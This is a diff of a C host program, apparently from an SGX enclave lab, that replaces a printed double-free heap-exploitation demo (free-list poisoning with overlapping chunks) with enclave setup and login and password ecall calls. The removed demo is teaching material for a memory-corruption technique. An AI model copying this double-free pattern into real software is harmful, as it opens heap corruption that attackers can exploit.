@@ -24,35 +24,45 @@
 #define DO_TIMER_STEP      0
 
 
+sgx_enclave_id_t create_enclave(void)
+{
+    sgx_launch_token_t token = {0};
+    int updated = 0;
+    sgx_enclave_id_t eid = -1;
+
+    info_event("Creating enclave...");
+    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
+                                    &token, &updated, &eid, NULL ) );
+
+    return eid;
+}
+
+void ocall_print(const char *str)
+{
+    info("ocall_print: enclave says: '%s'", str);
+}
+
+
+// !!! pointer a has to be uint64_t and not char*
+void ocall_print_address(const char *str, uint64_t a)
+{
+    info("ocall_print_address: enclave says: '%s' '%p'",str, (void*)a);
+}
+
+
+
 int main( int argc, char **argv )
 {
 
-    printf("🔴 Exploiting double free for free list poisoning\n");
+    //Create Enclave
+    sgx_enclave_id_t eid = create_enclave();
 
-    // Step 1: Allocate two chunks
-    char *chunk1 = malloc(64);
-    char *chunk2 = malloc(64);  // Prevent consolidation
+    ecall_login(eid, 1234, "secret_pw");
+    ecall_get_password(eid, 1234);
+    ecall_get_password(eid, 1235);
+    ecall_logout(eid, 1234);
 
-    printf("[+] Chunk1 allocated at: %p\n", chunk1);
-    printf("[+] Chunk2 allocated at: %p\n", chunk2);
-
-    // Step 2: Free the first chunk twice (Double Free)
-    free(chunk1);
-    free(chunk1);  // Double free vulnerability
-
-    // Step 3: Allocate two new chunks, one of which will return the same address as chunk1
-    char *chunk3 = malloc(64);
-    char *chunk4 = malloc(64);
-
-    printf("[+] Chunk3 allocated at: %p (should overlap with chunk1)\n", chunk3);
-    printf("[+] Chunk4 allocated at: %p\n", chunk4);
-
-    // Step 4: Overwrite chunk3 (which overlaps with chunk1) with fake free list pointers
-    strcpy(chunk3, "\x90\x90\x90\x90");  // Attacker-controlled data (could be a fake address)
-
-    // Step 5: Allocate another chunk, which should now return our manipulated memory
-    char *chunk5 = malloc(64);
-    printf("[+] Chunk5 allocated at: %p (attacker-controlled!)\n", chunk5);
+    
 
     return 0;
 }
